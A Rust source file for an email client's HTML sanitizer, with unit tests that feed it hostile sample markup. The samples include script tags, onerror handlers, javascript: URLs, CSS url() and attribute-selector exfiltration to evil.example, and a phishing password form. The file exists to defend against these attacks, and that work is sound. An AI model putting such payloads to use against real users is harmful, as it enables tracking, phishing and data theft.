//! HTML sanitization for message display.
//!
//! This is the layer that stands between a stranger's HTML and the user's
//! screen. It is one of three independent defenses: the
//! sanitizer removes hostile constructs, the sandboxed frame blocks scripts and
//! same-origin access, and the per-message CSP blocks network egress. Each
//! was measured to block a class the others do not, so this code must not
//! assume the others will catch what it misses.
//!
//! Design rules:
//! * **Allowlist, never blocklist.** Anything not explicitly permitted is gone.
//! * **CSS is executable-ish.** Attribute-selector exfiltration and layout
//!   attacks are real, so declarations are filtered and `url()` is banned
//!   outright inside styles.
//! * **Remote content is blocked by default** and *counted*, because "2
//!   trackers removed" is a user-visible promise, not a log line.
//! * **Fail closed.** Anything unparseable degrades to text.

use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

/// What the sanitizer did, for the UI to report honestly.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SanitizeReport {
    /// Remote resources (images, backgrounds) that were blocked.
    pub blocked_remote: usize,
    /// Whether the message contained script-ish constructs at all — useful for
    /// a "this message tried to run code" indicator.
    pub had_dangerous_constructs: bool,
}

#[derive(Debug, Clone)]
pub struct Sanitized {
    pub html: String,
    pub report: SanitizeReport,
}

/// CSS properties an email may set. Layout-affecting properties that enable
/// overlay/clickjacking attacks (`position`, `z-index`, `transform`) are absent
/// on purpose, as is anything that can fetch (`background-image`, `content`).
const ALLOWED_CSS: &[&str] = &[
    "color",
    "background-color",
    "font",
    "font-family",
    "font-size",
    "font-style",
    "font-weight",
    "line-height",
    "letter-spacing",
    "text-align",
    "text-decoration",
    "text-transform",
    "vertical-align",
    "white-space",
    "margin",
    "margin-top",
    "margin-bottom",
    "margin-left",
    "margin-right",
    "padding",
    "padding-top",
    "padding-bottom",
    "padding-left",
    "padding-right",
    "border",
    "border-top",
    "border-bottom",
    "border-left",
    "border-right",
    "border-color",
    "border-style",
    "border-width",
    "border-radius",
    "border-collapse",
    "width",
    "max-width",
    "height",
    "max-height",
    "display",
    "list-style",
    "list-style-type",
];

fn is_remote(url: &str) -> bool {
    let u = url.trim().to_ascii_lowercase();
    u.starts_with("http://") || u.starts_with("https://") || u.starts_with("//")
}

/// Gives a protocol-relative URL a scheme of its own.
///
/// `//host/logo.png` means "whatever scheme this document uses", which is a
/// sensible default on the web and a broken one here: the reading frame is
/// served over `petrel-msg:`, so the browser resolves it to
/// `petrel-msg://host/logo.png` and asks us for a message we do not have. The
/// image then fails silently even though the reader allowed remote content.
///
/// Resolved to `https:` rather than `http:` because a URL that declined to
/// name a scheme has expressed no preference, and one of the two is encrypted.
fn absolute_scheme(url: &str) -> std::borrow::Cow<'static, str> {
    let trimmed = url.trim_start();
    if trimmed.starts_with("//") {
        return format!("https:{trimmed}").into();
    }
    url.to_owned().into()
}

/// Filters a `style` attribute down to the allowlist. Any declaration that
/// could fetch a resource or reposition content is dropped rather than
/// rewritten — a mangled style is a cosmetic problem, a fetching one is a
/// privacy breach.
fn filter_style(value: &str) -> String {
    let mut kept = Vec::new();
    for decl in value.split(';') {
        let Some((prop, val)) = decl.split_once(':') else {
            continue;
        };
        let prop_norm = prop.trim().to_ascii_lowercase();
        let val_trim = val.trim();
        let val_norm = val_trim.to_ascii_lowercase();
        if !ALLOWED_CSS.contains(&prop_norm.as_str()) {
            continue;
        }
        // No fetching, no expressions, no escapes used to smuggle either.
        if val_norm.contains("url(")
            || val_norm.contains("expression")
            || val_norm.contains("javascript:")
            || val_norm.contains("@import")
            || val_norm.contains('\\')
        {
            continue;
        }
        kept.push(format!("{prop_norm}: {val_trim}"));
    }
    kept.join("; ")
}

fn builder_tags() -> HashSet<&'static str> {
    [
        "a",
        "b",
        "blockquote",
        "br",
        "caption",
        "code",
        "col",
        "colgroup",
        "dd",
        "div",
        "dl",
        "dt",
        "em",
        "figcaption",
        "figure",
        "h1",
        "h2",
        "h3",
        "h4",
        "h5",
        "h6",
        "hr",
        "i",
        "img",
        "li",
        "ol",
        "p",
        "pre",
        "q",
        "s",
        "small",
        "span",
        "strike",
        "strong",
        "sub",
        "sup",
        "table",
        "tbody",
        "td",
        "tfoot",
        "th",
        "thead",
        "tr",
        "u",
        "ul",
    ]
    .into_iter()
    .collect()
}

fn tag_attributes() -> HashMap<&'static str, HashSet<&'static str>> {
    let mut m: HashMap<&'static str, HashSet<&'static str>> = HashMap::new();
    m.insert("a", ["href", "title"].into_iter().collect());
    m.insert(
        "img",
        [
            "src", "alt", "title", "width", "height", "border", "hspace", "vspace",
        ]
        .into_iter()
        .collect(),
    );
    // The presentational table attributes, which in mail are not decoration
    // but structure. A great deal of real mail is a mosaic of image slices
    // positioned entirely by `<td width>` and held flush by `cellspacing="0"`;
    // drop those and the browser falls back to auto-layout and its default 2px
    // border-spacing, so the picture arrives cut into strips with white seams
    // between them. Every attribute here is geometry or a colour word: none of
    // them can fetch, script, or reposition content over the rest of the page.
    //
    // `background` is the exception: it takes a URL, so it is a remote fetch
    // and a tracking vector like any image. It is listed here but decided in
    // the attribute filter below, on exactly the same terms as `img src` —
    // removed and counted when remote content is blocked.
    let cell = [
        "colspan",
        "rowspan",
        "align",
        "valign",
        "width",
        "height",
        "bgcolor",
        "background",
    ];
    m.insert("td", cell.into_iter().collect());
    m.insert("th", cell.into_iter().collect());
    m.insert(
        "tr",
        ["align", "valign", "height", "bgcolor", "background"]
            .into_iter()
            .collect(),
    );
    m.insert(
        "table",
        [
            "width",
            "height",
            "align",
            "bgcolor",
            "border",
            "cellpadding",
            "cellspacing",
            "background",
        ]
        .into_iter()
        .collect(),
    );
    m
}

/// Sanitizes a message body for display.
///
/// `allow_remote` reflects an explicit user decision for this sender; when
/// false (the default), remote resources are removed and counted.
pub fn sanitize_html(html: &str, allow_remote: bool) -> Sanitized {
    let blocked = Arc::new(AtomicUsize::new(0));
    let blocked_cb = blocked.clone();

    // Cheap pre-scan purely for the "tried to run code" signal; removal is
    // ammonia's job, not this check's.
    let lower = html.to_ascii_lowercase();
    let had_dangerous = lower.contains("<script")
        || lower.contains("javascript:")
        || lower.contains(" onerror")
        || lower.contains(" onload")
        || lower.contains("<iframe")
        || lower.contains("<object")
        || lower.contains("<embed");

    let mut builder = ammonia::Builder::default();
    builder
        .tags(builder_tags())
        // Remove these tags *with their contents*. Stripping the tag alone
        // leaves the text behind, and for a phishing form the text is the
        // attack ("Sign in", "Verify your password"). Scripts and styles would
        // likewise dump their source into the rendered body.
        .clean_content_tags(
            [
                "script", "style", "form", "button", "input", "select", "option", "textarea",
                "iframe", "object", "embed", "applet", "noscript", "template", "svg", "math",
                "head", "title", "meta", "link", "base",
            ]
            .into_iter()
            .collect(),
        )
        .tag_attributes(tag_attributes())
        .generic_attributes(["style", "align", "dir", "lang"].into_iter().collect())
        // `cid:` stays so inline images can be resolved from the message's own
        // parts; `data:` is absent because it enables UI spoofing.
        .url_schemes(["http", "https", "mailto", "cid"].into_iter().collect())
        .link_rel(Some("noopener noreferrer nofollow"))
        // Namespacing stops a message's ids from colliding with (or targeting)
        // the surrounding document.
        .id_prefix(Some("m-"))
        .attribute_filter(
            move |element, attribute, value| match (element, attribute) {
                // `background` is a URL like `src` is, so it answers to the
                // same rule. Sharing the arm is the point: a second place that
                // decides whether mail may fetch something is a second place
                // for the two answers to drift apart.
                ("img", "src") | (_, "background") => {
                    if is_remote(value) && !allow_remote {
                        blocked_cb.fetch_add(1, Ordering::Relaxed);
                        return None;
                    }
                    Some(absolute_scheme(value))
                }
                (_, "style") => {
                    let filtered = filter_style(value);
                    if filtered.is_empty() {
                        None
                    } else {
                        Some(filtered.into())
                    }
                }
                _ => Some(value.into()),
            },
        );

    let html = builder.clean(html).to_string();
    Sanitized {
        html,
        report: SanitizeReport {
            blocked_remote: blocked.load(Ordering::Relaxed),
            had_dangerous_constructs: had_dangerous,
        },
    }
}

/// Points `cid:` images at somewhere a webview can actually fetch.
///
/// A `cid:` URL names one of the message's own MIME parts, and only a native
/// mail renderer knows how to follow it — to a webview it is a broken image.
/// The parts themselves are already served one by one over the message
/// protocol, so this rewrites each reference to that route and the picture
/// arrives from the message's own bytes, never the network.
///
/// Runs on *sanitized* HTML — the sanitizer keeps `cid:` URLs precisely so
/// this can resolve them — and matches the sanitizer's serialized form, which
/// HTML-escapes attribute values. A reference to a part the message does not
/// carry stays as it is: a broken placeholder is truthful, and inventing a
/// URL for it would only turn "the sender forgot the image" into a 404.
pub fn resolve_cids(
    html: &str,
    attachments: &[crate::Attachment],
    href: impl Fn(usize) -> String,
) -> String {
    let mut out = html.to_string();
    for (index, att) in attachments.iter().enumerate() {
        let Some(id) = att.content_id.as_deref() else {
            continue;
        };
        // The id as the sanitizer would have serialized it inside an
        // attribute. Angle brackets are already stripped at parse time.
        let escaped = id
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;");
        let target = href(index);
        // Both quoted attribute forms, because `src` on an img and
        // `background` on a table both survive sanitization.
        for needle in [format!("=\"cid:{escaped}\""), format!("='cid:{escaped}'")] {
            out = out.replace(&needle, &format!("=\"{target}\""));
        }
    }
    out
}

/// Renders a plain-text body as safe HTML, preserving quote structure.
pub fn plain_text_to_html(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 64);
    out.push_str("<div class=\"petrel-plain\">");
    for line in text.lines() {
        let escaped = line
            .replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;");
        if line.trim_start().starts_with('>') {
            out.push_str("<div class=\"q\">");
            out.push_str(&escaped);
            out.push_str("</div>");
        } else {
            out.push_str("<div>");
            out.push_str(&escaped);
            out.push_str("</div>");
        }
    }
    out.push_str("</div>");
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn clean(html: &str) -> String {
        sanitize_html(html, false).html
    }

    #[test]
    fn scripts_and_handlers_are_removed() {
        let out = clean(
            r#"<p onclick="steal()">hi</p><script>alert(1)</script>
               <img src="x" onerror="alert(2)"><iframe src="https://evil.example"></iframe>"#,
        );
        assert!(!out.contains("script"), "{out}");
        assert!(!out.contains("onclick"), "{out}");
        assert!(!out.contains("onerror"), "{out}");
        assert!(!out.contains("<iframe"), "{out}");
        assert!(out.contains("hi"), "legitimate text must survive: {out}");
    }

    #[test]
    fn table_geometry_survives() {
        // A sliced-image mosaic is positioned entirely by these attributes.
        // Losing them does not degrade the picture, it dismantles it.
        let res = sanitize_html(
            r##"<table cellpadding="0" cellspacing="0" border="0" bgcolor="#ff0000">
                 <tr valign="top"><td width="320" height="15" bgcolor="#ffffff">a</td></tr>
               </table>"##,
            true,
        );
        for want in [
            "cellpadding=\"0\"",
            "cellspacing=\"0\"",
            "width=\"320\"",
            "height=\"15\"",
            "valign=\"top\"",
            "bgcolor",
        ] {
            assert!(res.html.contains(want), "lost {want}: {}", res.html);
        }
    }

    #[test]
    fn cell_backgrounds_follow_the_remote_content_rule() {
        // A `background` URL fetches exactly like an image source, so it is
        // counted and removed on the same terms rather than treated as layout.
        let markup = r#"<table background="http://cdn.example/bg.png"><tr><td>x</td></tr></table>"#;

        let blocked = sanitize_html(markup, false);
        assert!(!blocked.html.contains("cdn.example"), "{}", blocked.html);
        assert_eq!(blocked.report.blocked_remote, 1);

        let allowed = sanitize_html(markup, true);
        assert!(
            allowed.html.contains("http://cdn.example/bg.png"),
            "{}",
            allowed.html
        );
        assert_eq!(allowed.report.blocked_remote, 0);
    }

    #[test]
    fn layout_attributes_cannot_smuggle_a_fetch() {
        // The geometry allowlist must stay geometry: anything taking a URL has
        // to go through the remote-content decision, never round it.
        let res = sanitize_html(
            r#"<td style="background-image: url('https://evil.example/x')" width="10">a</td>"#,
            true,
        );
        assert!(!res.html.contains("evil.example"), "{}", res.html);
    }

    #[test]
    fn protocol_relative_images_are_given_a_scheme() {
        // `//host/x.png` inherits the document's scheme, and the document is
        // served over `petrel-msg:` — so left alone it resolves to a message
        // URL that cannot exist, and the image fails with remote content on.
        let res = sanitize_html(r#"<img src="//cdn.example/logo.png">"#, true);
        assert!(
            res.html.contains("https://cdn.example/logo.png"),
            "{}",
            res.html
        );
    }

    #[test]
    fn protocol_relative_images_are_still_blocked_when_remote_is_off() {
        let res = sanitize_html(r#"<img src="//cdn.example/logo.png">"#, false);
        assert!(!res.html.contains("cdn.example"), "{}", res.html);
        assert_eq!(res.report.blocked_remote, 1);
    }

    #[test]
    fn plaintext_image_hosts_survive_when_remote_is_allowed() {
        // Older mail is full of these; the reading pane's policy has to admit
        // the scheme as well as keeping the URL.
        let res = sanitize_html(r#"<img src="http://image.example/spacer.gif">"#, true);
        assert!(
            res.html.contains("http://image.example/spacer.gif"),
            "{}",
            res.html
        );
        assert_eq!(res.report.blocked_remote, 0);
    }

    #[test]
    fn dangerous_url_schemes_are_dropped() {
        let out = clean(
            r#"<a href="javascript:alert(1)">click</a>
               <a href="data:text/html,<script>x</script>">data</a>
               <a href="https://example.com/ok">fine</a>"#,
        );
        assert!(!out.contains("javascript:"), "{out}");
        assert!(!out.contains("data:text/html"), "{out}");
        assert!(out.contains("https://example.com/ok"), "{out}");
        // Outbound links must not hand the opener over to the destination.
        assert!(out.contains("noopener"), "{out}");
    }

    #[test]
    fn remote_images_are_blocked_and_counted() {
        let res = sanitize_html(
            r#"<img src="https://tracker.example/pixel.gif?u=1" width="1" height="1">
               <img src="http://other.example/beacon.png">
               <img src="cid:inline-part-1">"#,
            false,
        );
        assert_eq!(res.report.blocked_remote, 2);
        assert!(!res.html.contains("tracker.example"), "{}", res.html);
        assert!(!res.html.contains("beacon.png"), "{}", res.html);
        // Inline parts are the message's own content, not a network fetch.
        assert!(res.html.contains("cid:inline-part-1"), "{}", res.html);
    }

    #[test]
    fn cid_images_resolve_to_the_part_route_after_sanitizing() {
        let attachments = vec![
            crate::Attachment {
                filename: Some("logo.png".into()),
                content_type: Some("image/png".into()),
                size: 10,
                content_id: Some("logo@mailer.example".into()),
                is_inline: true,
            },
            crate::Attachment {
                filename: Some("report.pdf".into()),
                content_type: Some("application/pdf".into()),
                size: 99,
                content_id: None,
                is_inline: false,
            },
            crate::Attachment {
                filename: None,
                content_type: Some("image/jpeg".into()),
                size: 12,
                content_id: Some("photo&2@mailer.example".into()),
                is_inline: true,
            },
        ];
        // Through the real sanitizer first, because that is the shape the
        // resolver actually receives — escaped attributes and all.
        let sanitized = sanitize_html(
            r#"<img src="cid:logo@mailer.example"><img src="cid:photo&2@mailer.example">"#,
            false,
        );
        let out = resolve_cids(&sanitized.html, &attachments, |i| {
            format!("/attachment/tok/{i}")
        });
        assert!(out.contains(r#"src="/attachment/tok/0""#), "{out}");
        // The ampersand id matches through the sanitizer's own escaping, and
        // resolves to index 2 — position in the part list, not among cids.
        assert!(out.contains(r#"src="/attachment/tok/2""#), "{out}");
        assert!(!out.contains("cid:"), "{out}");
    }

    #[test]
    fn a_cid_no_part_answers_stays_a_cid() {
        let attachments = vec![crate::Attachment {
            filename: None,
            content_type: Some("image/png".into()),
            size: 5,
            content_id: Some("present@x".into()),
            is_inline: true,
        }];
        let out = resolve_cids(r#"<img src="cid:missing@x">"#, &attachments, |i| {
            format!("/attachment/tok/{i}")
        });
        // The sender referenced a part they never attached. A truthful broken
        // image, not an invented URL.
        assert_eq!(out, r#"<img src="cid:missing@x">"#);
    }

    #[test]
    fn consent_allows_remote_images() {
        let res = sanitize_html(r#"<img src="https://cdn.example/logo.png">"#, true);
        assert_eq!(res.report.blocked_remote, 0);
        assert!(res.html.contains("cdn.example/logo.png"));
    }

    /// CSS is an exfiltration channel, not just styling: a `url()` in a
    /// stylesheet was observed phoning home from inside a sandboxed frame.
    #[test]
    fn css_cannot_fetch_or_reposition() {
        let out = clean(
            r#"<p style="color: red; background-image: url('https://evil.example/x?a=1')">a</p>
               <div style="position: fixed; top: 0; z-index: 99999; width: 100%">overlay</div>
               <span style="background: url(https://evil.example/y)">b</span>
               <b style="width: expression(alert(1))">c</b>"#,
        );
        assert!(!out.contains("evil.example"), "css must not fetch: {out}");
        assert!(!out.contains("position"), "no overlay positioning: {out}");
        assert!(!out.contains("z-index"), "{out}");
        assert!(!out.contains("expression"), "{out}");
        // The safe declaration survives, so ordinary mail still looks right.
        assert!(out.contains("color: red"), "{out}");
    }

    #[test]
    fn attribute_selector_exfiltration_is_defused() {
        // The PortSwigger class of attack: a style block whose selectors leak
        // input values one character at a time.
        let out = clean(
            r#"<style>input[value^="a"]{background:url(https://evil.example/a)}</style>
               <input value="secret"><p>body</p>"#,
        );
        assert!(!out.contains("evil.example"), "{out}");
        assert!(
            !out.contains("<style"),
            "style blocks are not allowed: {out}"
        );
        assert!(
            !out.contains("<input"),
            "form inputs are not allowed: {out}"
        );
        assert!(out.contains("body"));
    }

    #[test]
    fn forms_and_embedded_objects_are_removed() {
        let out = clean(
            r#"<form action="https://evil.example/post"><input name="p" type="password">
               <button>Sign in</button></form><object data="x.swf"></object><embed src="y">"#,
        );
        assert!(!out.contains("<form"), "{out}");
        assert!(!out.contains("password"), "{out}");
        assert!(!out.contains("<object"), "{out}");
        assert!(!out.contains("<embed"), "{out}");
        // The form's *text* goes too: "Sign in" is the phishing lure, and
        // leaving it behind produces a convincing fragment with no form.
        assert!(
            !out.contains("Sign in"),
            "form contents must not survive: {out}"
        );
    }

    #[test]
    fn script_and_style_source_never_leaks_into_the_body() {
        let out = clean(
            "<style>body{color:red}</style><script>var secret = 'leak me';</script><p>text</p>",
        );
        assert!(!out.contains("color:red"), "{out}");
        assert!(!out.contains("leak me"), "{out}");
        assert!(out.contains("text"));
    }

    /// A message must not be able to name elements in the surrounding document.
    /// `id` isn't on the allowlist at all, so it is removed rather than
    /// namespaced — stricter than needed, and the cost (in-message anchor links
    /// stop working) is one almost no mail relies on. `id_prefix` stays
    /// configured so that if ids are ever admitted, they arrive namespaced.
    #[test]
    fn ids_cannot_reach_the_surrounding_document() {
        let out = clean(r#"<div id="app-root">x</div><span id="root">y</span>"#);
        assert!(!out.contains("app-root"), "{out}");
        assert!(!out.contains("id="), "{out}");
        assert!(
            out.contains('x') && out.contains('y'),
            "content survives: {out}"
        );
    }

    #[test]
    fn ordinary_formatting_survives_intact() {
        let out = clean(
            r#"<p><b>Bold</b> and <i>italic</i>, a <a href="https://example.com">link</a>,
               <ul><li>one</li><li>two</li></ul>
               <table><tr><td colspan="2">cell</td></tr></table>
               <blockquote>quoted</blockquote></p>"#,
        );
        for expected in [
            "<b>",
            "<i>",
            "<ul>",
            "<li>",
            "<table>",
            "colspan",
            "<blockquote>",
        ] {
            assert!(out.contains(expected), "lost {expected}: {out}");
        }
    }

    #[test]
    fn hostile_input_never_panics() {
        for raw in [
            "",
            "<",
            "<<<<<<",
            "<p".repeat(5000).as_str(),
            "<div>".repeat(2000).as_str(),
            "\u{0}\u{1}<p>x</p>",
            "<p style=\"color:\">x</p>",
            "<p style=\";;;;\">x</p>",
        ] {
            let _ = sanitize_html(raw, false);
        }
    }

    #[test]
    fn plain_text_is_escaped_and_quotes_marked() {
        let out = plain_text_to_html("hello <script>\n> quoted line\nplain");
        assert!(!out.contains("<script>"), "{out}");
        assert!(out.contains("&lt;script&gt;"), "{out}");
        assert!(
            out.contains("class=\"q\""),
            "quotes should be marked: {out}"
        );
    }
}
